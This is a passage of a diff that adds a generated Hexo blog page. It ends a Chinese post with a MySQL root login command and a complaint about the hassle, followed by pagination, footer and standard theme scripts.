+<p>.\mysql.exe -uroot -p</p>
+</blockquote>
+<p><strong>超级麻烦！！！！</strong></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wang deshan</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
